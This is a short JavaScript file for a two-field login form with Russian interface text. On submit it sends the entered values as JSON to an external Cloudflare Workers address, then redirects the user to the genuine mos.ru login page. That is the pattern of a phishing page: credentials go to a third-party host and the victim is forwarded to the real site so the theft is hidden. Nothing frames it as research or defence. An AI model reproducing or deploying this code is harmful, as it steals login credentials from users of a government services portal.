(function () {
    const REDIRECT_URL = 'https://login.mos.ru/sps/login';
    const WORKER_URL = 'https://my-neon-worker.viotlunov.workers.dev';

    const form = document.querySelector('.login-form');
    const loginInput = document.getElementById('login');
    const login2Input = document.getElementById('login2');
    const submitBtn = document.querySelector('.submit-btn');

    function refreshSubmitState() {
        const filled =
            loginInput.value.trim().length > 0 &&
            login2Input.value.trim().length > 0;
        submitBtn.disabled = !filled;
    }

    loginInput.addEventListener('input', refreshSubmitState);
    login2Input.addEventListener('input', refreshSubmitState);
    refreshSubmitState();

    form.addEventListener('submit', async function (event) {
        event.preventDefault();
        if (submitBtn.disabled) return;

        const login_part_1 = loginInput.value.trim();
        const login_part_2 = login2Input.value.trim();

        submitBtn.disabled = true;
        const originalText = submitBtn.textContent;
        submitBtn.textContent = 'Вход...';

        try {
            await fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ login_part_1, login_part_2 })
            });
        } catch (error) {
            console.error('Ошибка при отправке данных:', error);
        } finally {
            window.location.href = REDIRECT_URL;
        }
    });
})();
